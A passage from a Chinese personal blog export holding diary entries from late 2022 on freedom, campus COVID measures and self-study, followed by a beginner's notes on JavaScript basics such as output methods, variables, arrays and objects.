<h1 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h1><p>很多年前看到这个故事，是在一本杂志的卷首。说实话，这给了我非常大的触动。在这之前，我一直认为，抵挡不住诱惑是因为自身的意志力不够，所以才会被欲望牵着鼻子走。可看了这样一个如此优秀的人都没有对自己自制力感到自信，我也释然了。<br>像这样有智慧的人，即便是在他小时候，已经能明悟这种很多人不明白的道理，也远超大多成年人了。</p>
<h1 id="世界杯"><a href="#世界杯" class="headerlink" title="世界杯"></a>世界杯</h1><p>如果世界杯的火爆只是因为赌球，那只能是一种悲哀。因为赌球无非是贪欲和浮躁的混杂，既无技术又无规律，毫无看点可言。<br>虽然我对世界杯没有兴趣，却也不愿看到这种光景。<br>然而，其实我们也可以反思当下环境中赌球之心如此热烈的原因。主要原因就是经济衰退，赚钱困难。也可谓人之常情吧。<br>最近周围很多人都在谈论赌球，甚至参与赌球。但我绝不参与，无论周围人之后翻了多少倍我也不会眼红。原因，已经在上面故事里讲得很清楚了。只是即便如此也会被影响，还是略有不适吧。<br>好笑的是，原本周围两个冷战关系不好的人，却因为世界杯赌球聊起来了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我现在就像是在淤泥中，愿我能不染。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>是非成败转头空</title>
    <url>/2022/11/24/Diary_1124/</url>
    <content><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.jpg" alt="本间芽衣子"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p>
<h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p>
<h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p>
<ul>
<li>高级快乐和低级快乐，快乐有质的不同</li>
<li>调和美德与幸福的冲突，美德也是一种幸福</li>
<li>正义需要感性的力量，有别于利益</li>
</ul>
<p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>宁为玉碎</title>
    <url>/2022/11/25/Diary_1125/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png" alt="凉宫春日"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的生活一如既往，平淡且平静。不过今天似乎在乌鲁木齐没有那么安宁，然而我也做不了什么。逝者愿安息，生者愿平安。</p>
<h1 id="点滴"><a href="#点滴" class="headerlink" title="点滴"></a>点滴</h1><p>今天的学习状态还是比较满意的，只是学习时长不够长。今日杂务做完了，明天多学习，尤其English!<br>学到了一个小知识：喝水温度对65℃以上对口腔不好。感受到烫一般是50℃以上。<br>昨晚又晚睡了，这不好，再次提醒自己要早睡。早起吃早餐听听力。</p>
<h1 id="激进分子"><a href="#激进分子" class="headerlink" title="激进分子"></a>激进分子</h1><p>No progress without radicals.没有激进分子就没有进步。<br>这是我今天听听力，听到的一句话。其实没预料到，听听力也能听出一些深刻的话。遇到了一篇蛮有趣的文章。<br>想想其实的确如此，很多事物的改变就是来源于“激进分子”。当然，这个激进分子是广义上的。<br>比如乔布斯，在各个手机厂商都流行在手机上加更多的键时，他一意孤行选择了只给手机保留一个键，这何尝不是一种激进呢？<br>还有很多例子，都可以说明，激进并不一定是一件坏事。<br>社会的大多数人，都是倾向于稳定的。因此激进很容易被反对，也不会被大多数人所理解。这也意味着，激进分子是少数人的“特权”。<br>具前瞻性的言论未必会为时人所接受。但当时间证明了该言论的价值时，社会各界又会争相附和。<br>这就和之前的“不容，然后见君子”其实是联系到一起了。<br>本质上表达的思想是相同的。<br>当然，激进并非代表愚昧的激进，而是明智的激进才是有益的。愚蠢的激进只是滑稽的表演。<br>最后，未来想要更激进一点，如果有人用radical来形容我，我想我会把这个词当作称赞的。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>再借我一点时间吧，我会更珍惜的。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>默哀</title>
    <url>/2022/11/28/Diary_1128/</url>
    <content><![CDATA[<p><img src="/images/Say.jpg" alt="黑格尔《精神现象学》"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原谅我这一生放纵不羁爱自由。</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>Give me liberty, or give me death!<br>不自由，毋宁死！<br>--帕特里克·亨利</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>我本可以忍受黑暗<br>如果我不曾见过太阳<br>然而阳光已使我的荒凉<br>成为更新的荒凉<br>--艾米莉·狄金森《如果我不曾见过太阳》</p>
<h1 id="怎样生活"><a href="#怎样生活" class="headerlink" title="怎样生活"></a>怎样生活</h1><p>顾及太多，就不自由了。很多人，其实并非是不愿意去呼喊自由，而是身边的家人朋友乃至职业社会地位等等限制了他们。<br>所以在一个不自由的地方，呼喊自由的人，往往是年轻人以及一无所有的人。<br>这些我都不想探讨。我只想说一个话题：<br>做一只快乐的猪，还是做一个痛苦的人？<br>这是苏格拉底的一句名言，他的回答是后者。我也是。<br>我不知道这样伟大的哲学家是怎么思考的。我只知道，生命的奇迹是如此美妙，做平庸的人未免太过无聊。况且活着的喜悦是不会消失的，只要还活着，一切痛苦都无法冲散活着的那份喜悦。畏畏缩缩安分守己或许是某些人的生活方式，但不是我的作风。我也不愿与这样的人为伍。<br>我承认，我并不是完全有勇气，也不是毫无利己之心。可我更不愿因自身之枷锁而放弃对勇气等品质的追求。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天想到的两句话，比较激进，加个密(Base58_STRING utf-8)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3jDiNnSuNi6BJfuv5SCFofiTrp2pVd1erpsBoJbtp9U4N7CY9J77d8FugTKcno8nQg6M7Ytr2CLcMWmBeBhqtAeTswsaRupadz5vggntxPWvXao8gDZrfY2SZmULh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>年末月初</title>
    <url>/2022/12/01/Diary_1201/</url>
    <content><![CDATA[<p><img src="/images/12.jpg" alt="彼岸花"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天发生了许多事，我却觉得有一种新鲜感。</p>
<h1 id="降临"><a href="#降临" class="headerlink" title="降临"></a>降临</h1><p>本来学校一直没有什么阳性，从疫情出现以来。<br>不过嘛，根据墨菲定律，也是该发生一回了。<br>我一直没有经历过，网传很多也遥远得像另一星球发生的故事让我不知该作何反应。<br>于是这一天终于到来了，昨天本来要打算出门了，但周围人口耳相传的消息总算是敲了敲我的外壳，似乎是告诉我“今天的报纸送到了哦。”<br>我自然也如老大爷般喝着茶波澜不惊地看着报纸，仿佛一切都是国际新闻--与我无关。<br>直到发现另一寝室的人跑去抢购食品了我才意识到，情况似乎有点严重？尽管如此，过了一会儿还是悠哉游哉地去食堂吃晚餐了。<br>周围一人欲出校门未果，遂转来投奔于我。饭饱之后兴致大发，逛一逛许久没走过的“校园河山”。探到通往校外的幽径，便心满意足地回去了。<br>最终也没有如猜测中封寝，大概是防疫管控的松口还是有那么一些效果，变得稍微有了个人样。<br>这便是昨天的故事。<br>今日未到教室上课，早八的网课只是伴我继续睡觉。又有新阳性的出现为这个小小的校园平添了恐慌等的负面情绪。接下来，又会如何呢？</p>
<h1 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h1><p>在这个事上，校方对学生以及网络都在隐瞒。恐怕是害怕事情闹大，管控不住舆论，最终导致自己承担罪责，担当替罪羊，丢掉乌纱帽。这便是常态，或许任何一个人都会感到这件事上的荒谬，经历得多了却容易让人麻木。或许很多学生都会感到恐慌气愤不解吧，可是我没什么感觉，为许许多多事愤怒过，最终平息了。即便是盛大的火山，也终有喷发完之时。这是自然规律，人也遵循人性规律。可唯有打破这种人性，才能突破桎梏，做一个痛苦的“人”。<br>产生的这些负面情绪，得不到发泄的地方，最终会造成一件事，信任缺失。校方从一开始就没有信任学生，对学生公布真实情况。这也必然造成学生无法信任学校。互相之间信任度越来越低，倘若得不到缓解终有一天会物极必反。首先从管理配合上会让校方付出更多成本代价，其次矛盾冲突也会慢慢上升，双方之间的隔阂也会逐渐加剧。往后会如何我并不可知，也不屑于知道。<br>在某国的学校与学生之间，学生是绝对的弱势群体，同gov与people的关系很相像。况且学校还有来自gov的加持，更是让差距拉得过大。悲哀的是，掌握大权却没有学生的制约，几乎没有什么办法改善。学生能如何呢？以头抢地耳！<br>很明显，在这个囚徒困境中，学校是最先背叛的那一方。那么自然也是问题最大的一方。<br>就这样吧，2点过了。</p>
<h1 id="灵感"><a href="#灵感" class="headerlink" title="灵感"></a>灵感</h1><p>有时候写点东西，有灵感，便如洪水般涌出。没有灵感的时候，想挤点啥都困难呢。而我写了这么多日记，今天是第一次感觉自己有点灵感。碍于时间也只能匆匆结束。<br>曾想象自己是一个作家，也许每天都在挤榨自己脑海里的一点油墨吧。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我想看书的啊，又到这个时候了，烦诶。<br>明天一定要看叔本华的 <strong>作为意志和表象的世界</strong>！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>不知老之将至</title>
    <url>/2022/12/10/Diary_1202/</url>
    <content><![CDATA[<p><img src="/images/%E8%99%B9%E5%A4%8F_1.png" alt="虹夏"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好多天没写了，主要是因为懒吧。今天也很迟了，还是要写，不能一直松懈下去。</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>发愤忘食，乐以忘忧，不知老之将至云尔。<br>--孔子</p>
<h1 id="孔子的英文"><a href="#孔子的英文" class="headerlink" title="孔子的英文"></a>孔子的英文</h1><p>近来看到孔子的一句英文，但我实在想不起对应的中文原文是什么了，按理说应该有名啊，这里暂且写一下英文：<br>Our greatest glory is not in never falling, but in rising every time we fall.<br>以后有意再找找吧。</p>
<h1 id="记录近况"><a href="#记录近况" class="headerlink" title="记录近况"></a>记录近况</h1><p>约莫有十天没写了吧，从我因为住的楼里出现新冠阳性，到我从小道溜出学校住亲戚家，再到全校自愿返家，人走的差不多，最后寝室唯我一人。<br>大致上就是如此吧，流水账不必多言。</p>
<h1 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h1><p>由于六级推迟至明年3月初，我也从备考六级中解放出来，用更多精力去看web安全方面的内容。<br>不过学得太浅了，怎么说呢？看视频和博客，再自己写博客。也没怎么练习，很多东西一知半解，让我觉得轻飘飘的，看似把知识学进脑中，实则什么也不会。这种感觉很不好受。<br>还是需要，看视频，毕竟这样印象要深一些，而且必须要多进行实际练习，比如ctf，漏洞复现之类的。我将把大部分精力都放在实际练习上，知识的东西如果不会有效运用，终究是无趣的教条。<br>一个人住在寝室里，感觉自己就像在闭关修炼，其实感觉还不错？</p>
<h1 id="幸福的联系"><a href="#幸福的联系" class="headerlink" title="幸福的联系"></a>幸福的联系</h1><p>今天有人向我寻求问题的解答，大致是关于恋爱的事。<br>说着说着就谈到了幸福的问题。那人认为，幸福是每个人自己的，也即每个人的幸福是分开的，并不具有很强的联系。如果自己的幸福最大化，常常也会减损他人的幸福，也即是一种互斥的关系。<br>可在我看来，只有自己幸福最大化，才能让身边的人幸福。越是亲近的人，越会因我的幸福而变得幸福。也就是说，每个人的幸福之间具有很强的联系。倘若让他人伴我共赴地狱能使我幸福，那我会毫不犹豫邀请。因为我的幸福，即为我亲近之人的幸福。<br>常见的例子还有父母与孩子之间，孩子的幸福是父母的幸福。<br>但这个问题也是一个复杂的问题，比如身边的人关系亲疏是到什么程度，才会符合自己的幸福会给他人带来幸福？还有是些什么样的情形才符合？很多方面仍需思考，还不成熟。慢慢思考，以后专门写一篇文章吧。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我们都在等待，等待着别人来拯救我们自己。 --列夫·托尔斯泰</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>JS study record</title>
    <url>/2022/11/27/JS_study/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是对于JS学习的简单记录，以便于加强自身记忆。</p>
<span id="more"></span>


<h1 id="JavaScript-简介"><a href="#JavaScript-简介" class="headerlink" title="JavaScript 简介"></a>JavaScript 简介</h1><p>JavaScript 是脚本语言。其特点有：轻量级，可插入HTML页面，插入后可由所有现代浏览器执行。<br>JavaScript 的用处：</p>
<ul>
<li>直接写入 HTML 输出流</li>
<li>对事件的反应</li>
<li>改变 HTML 内容</li>
<li>改变 HTML 图像</li>
<li>改变 HTML 样式</li>
<li>验证输入<br>注意：JavaScript和Java是两种完全不同的语言，无论在概念上还是设计上。</li>
</ul>
<h1 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h1><p>HTML 中的 Javascript 脚本代码必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。<br>Javascript 脚本代码可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 部分中。<br>Javascript 脚本可以保存在外部文件，外部文件通常包含被多个网页使用的代码。<br>外部 JavaScript 文件的文件扩展名是 .js。<br>如需使用外部文件，请在 &lt;script&gt; 标签的 “src” 属性中设置该 .js 文件：<br>实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;myScript.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：外部脚本不能包含 &lt;script&gt; 标签</p>
<h1 id="运行调试"><a href="#运行调试" class="headerlink" title="运行调试"></a>运行调试</h1><p>打开浏览器，F12可以查看页面情况<br>Console窗口调试 JavaScript 代码<br>可以在浏览器中创建一个小脚本执行，具体方法看最下面链接的第4节（Javascript Chrome 中运行）的末尾</p>
<h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p>JavaScript 没有任何打印或者输出的函数。</p>
<h2 id="显示数据的方式"><a href="#显示数据的方式" class="headerlink" title="显示数据的方式"></a>显示数据的方式</h2><ol>
<li>使用 <code>window.alert()</code> 弹出警告框</li>
<li>使用 <code>document.write</code> 方法将内容写到HTML文档中</li>
<li>使用 <code>innerHTML</code> 写入到HTML元素</li>
<li>使用 <code>console.log()</code> 写入到浏览器控制台</li>
</ol>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
<li>关于 <code>console.log()</code> ：<br>相比alert他的优点是：<br>他能看到结构化的东西，如果是alert，弹出一个对象就是[object object],但是console能看到对象的内容。<br>console不会打断你页面的操作，如果用alert弹出来内容，那么页面就死了，但是console输出内容后你页面还可以正常操作。</li>
<li>关于 <code>document.write()</code> ：<br>document.write是直接写入到页面的内容流，如果在写之前没有调用document.open, 浏览器会自动调用open。每次写完关闭之后重新调用该函数，会导致页面被重写。 </li>
<li>关于 <code>innerHTML</code> :<br>innerHTML则是DOM页面元素的一个属性，代表该元素的html内容。你可以精确到某一个具体的元素来进行更改。如果想修改document的内容，则需要修改document.documentElement.innerElement。<br>innerHTML很多情况下都优于document.write，其原因在于其允许更精确的控制要刷新页面的那一个部分。</li>
<li>关于 <code>window.alert()</code> :<br>window.alert(5+6) 与 window.alert(“5+6”) 输出的值是不一样的。window.alert(5+6) 会输出 11，而window.alert(“5+6”) 会输出 5+6。这是因为当用引号时会认为引号中是字符串，从而直接将引号中的内容打印出来。</li>
</ol>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h2><ul>
<li><strong>数字（Number）字面量</strong> 可以是整数或者是小数，或者是科学计数(e)  3.14</li>
<li><strong>字符串（String）字面量</strong> 可以使用单引号或双引号  ‘John Doe’</li>
<li><strong>表达式字面量</strong> 用于计算： 5+6</li>
<li><strong>数组（Array）字面量</strong> 定义一个数组   <code>[40, 100, 1, 5, 25, 10]</code></li>
<li><strong>对象（Object）字面量</strong> 定义一个对象  <code>&#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;, age:50, eyeColor:&quot;blue&quot;&#125;</code></li>
<li><strong>函数（Function）字面量</strong> 定义一个函数  <code>function myFunction(a, b) &#123; return a * b;&#125;</code></li>
</ul>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量用于存储数据值。JavaScript 使用关键字 var 来定义变量， 使用等号来为变量赋值：<br><code>var x   x = 5 </code><br>注意：变量是一个名称，字面量是一个值。</p>
<h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><p>和其它语言基本一致</p>
<h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><p>在 HTML 中，JavaScript 语句用于向浏览器发出命令。<br>语句是用分号分隔 <code>x=5+6;</code></p>
<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>JavaScript 同样保留了一些关键字，这些关键字在当前的语言版本中并没有使用，但在以后 JavaScript 扩展中会用到。</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>双斜杠 &#x2F;&#x2F; 后的内容将会被浏览器忽略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 我不会执行</span><br></pre></td></tr></table></figure>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等。<br>JavaScript是弱类型编程语言,定义变量都使用 var 定义,与 Java 这种强类型语言有区别。<br>在定义后可以通过 <code>typeOf()</code> 来获取JavaScript中变量的数据类型<br>注意: typeof 不能用来判断是 Array 还是Object<br>使用 <code>isArray</code> 方法可以判断是否为数组<br>使用 <code>instanceof</code> 操作符也可以判断是否为数组</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>JavaScript 语句可以写在函数内，函数可以重复引用：<br>引用一个函数 &#x3D; 调用函数(执行函数内的语句)。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;                                <span class="comment">// 返回 a 乘以 b 的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="字母大小写"><a href="#字母大小写" class="headerlink" title="字母大小写"></a>字母大小写</h2><p>JavaScript 对大小写是敏感的<br>函数 getElementById 与 getElementbyID 是不同的。<br>同样，变量 myVariable 与 MyVariable 也是不同的。</p>
<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>JavaScript 使用 Unicode 字符集。<br>Unicode 覆盖了所有的字符，包含标点等字符。</p>
<h1 id="语句-1"><a href="#语句-1" class="headerlink" title="语句"></a>语句</h1><h2 id="分号"><a href="#分号" class="headerlink" title="分号"></a>分号</h2><p>在 JavaScript 中，用分号来结束语句是可选的。</p>
<h2 id="对代码行进行折行"><a href="#对代码行进行折行" class="headerlink" title="对代码行进行折行"></a>对代码行进行折行</h2><p>可以在文本字符串中使用反斜杠对代码行进行换行。例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;你好 \</span></span><br><span class="line"><span class="string">世界!&quot;</span>);</span><br></pre></td></tr></table></figure>


<h1 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h1><p>单行注释以 <code>//</code> 开头。<br>多行注释以 <code>/*</code> 开始，以 <code>*/</code> 结尾。</p>
<h1 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h1><p>可以把变量看做存储数据的容器。</p>
<h2 id="Javascript变量"><a href="#Javascript变量" class="headerlink" title="Javascript变量"></a>Javascript变量</h2><ul>
<li>变量必须以字母开头</li>
<li>变量也能以$和_符号开头（不推荐）</li>
<li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li>
</ul>
<h2 id="一条语句，多个变量"><a href="#一条语句，多个变量" class="headerlink" title="一条语句，多个变量"></a>一条语句，多个变量</h2><p>可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：<br><code>var lastname=&quot;Doe&quot;, age=30, job=&quot;carpenter&quot;;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lastname=&quot;Doe&quot;,</span><br><span class="line">age=30,</span><br><span class="line">job=&quot;carpenter&quot;;</span><br></pre></td></tr></table></figure>
<p>一条语句中声明的多个变量不可以同时赋同一个值:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var x,y,z=1;    x,y 为 undefined， z 为 1</span><br></pre></td></tr></table></figure>
<h2 id="Value-x3D-undefined"><a href="#Value-x3D-undefined" class="headerlink" title="Value &#x3D; undefined"></a>Value &#x3D; undefined</h2><p>在计算机程序中，经常会声明无值的变量。未使用值来声明的变量，其值实际上是 undefined。例如：<br><code>var carname;</code></p>
<h2 id="重新声明-JavaScript-变量"><a href="#重新声明-JavaScript-变量" class="headerlink" title="重新声明 JavaScript 变量"></a>重新声明 JavaScript 变量</h2><p>如果重新声明 JavaScript 变量，该变量的值不会丢失：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var carname=&quot;Volvo&quot;;</span><br><span class="line">var carname;     			值依然是&quot;Volvo&quot;</span><br></pre></td></tr></table></figure>

<h2 id="使用-let-和-const-ES6"><a href="#使用-let-和-const-ES6" class="headerlink" title="使用 let 和 const (ES6)"></a>使用 let 和 const (ES6)</h2><p>在 2015 后的 JavaScript 版本 (ES6) 允许我们使用 const 关键字来定义一个常量，使用 let 关键字定义的限定范围内作用域的变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let var1 [= value1] [, var2 [= value2]] [, ..., varN [= valueN]];</span><br></pre></td></tr></table></figure>
<p>let允许声明一个作用域被限制在块级中的变量、语句或者表达式。在Function中局部变量推荐使用let变量，避免变量名冲突。<br>作用域规则<br>let 声明的变量只在其声明的块或子块中可用，这一点，与var相似。二者之间最主要的区别在于var声明的变量的作用域是整个封闭函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">letTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">2</span>;       <span class="comment">// 不同的变量    </span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x);  <span class="comment">// 2  </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);  <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数据类型-1"><a href="#数据类型-1" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="JavaScript-拥有动态类型"><a href="#JavaScript-拥有动态类型" class="headerlink" title="JavaScript 拥有动态类型"></a>JavaScript 拥有动态类型</h2><p>JavaScript 拥有动态类型。这意味着相同的变量可用作不同的类型：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x;               <span class="comment">// x 为 undefined</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;           <span class="comment">// 现在 x 为数字</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;John&quot;</span>;      <span class="comment">// 现在 x 为字符串</span></span><br></pre></td></tr></table></figure>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>创建数组的四种方式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);    <span class="comment">//这是一个预定义的数组，在创建时初始化</span></span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> ];       <span class="comment">//同样是在创建时初始化，但是这种创建更为简洁直观</span></span><br><span class="line"><span class="keyword">var</span> arr3 = <span class="keyword">new</span> <span class="title class_">Array</span>( );   <span class="keyword">var</span> arr4 = [ ];     <span class="comment">//这两种是创建空的数组</span></span><br></pre></td></tr></table></figure>
<p>下面的代码创建名为 cars 的数组：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">cars[<span class="number">0</span>]=<span class="string">&quot;Saab&quot;</span>;</span><br><span class="line">cars[<span class="number">1</span>]=<span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line">cars[<span class="number">2</span>]=<span class="string">&quot;BMW&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>或者 (condensed array):</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">firstname</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastname</span>:<span class="string">&quot;Doe&quot;</span>, <span class="attr">id</span>:<span class="number">5566</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。<br>空格和折行无关紧要。声明可横跨多行。<br>对象属性有两种寻址方式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">name=person.<span class="property">lastname</span>;</span><br><span class="line">name=person[<span class="string">&quot;lastname&quot;</span>];</span><br></pre></td></tr></table></figure>

<h2 id="Undefined-和-Null"><a href="#Undefined-和-Null" class="headerlink" title="Undefined 和 Null"></a>Undefined 和 Null</h2><p>Undefined 这个值表示变量不含有值。<br>可以通过将变量的值设置为 null 来清空变量。</p>
<h2 id="声明变量类型"><a href="#声明变量类型" class="headerlink" title="声明变量类型"></a>声明变量类型</h2><p>当声明新变量时，可以使用关键词 “new” 来声明其类型：</p>
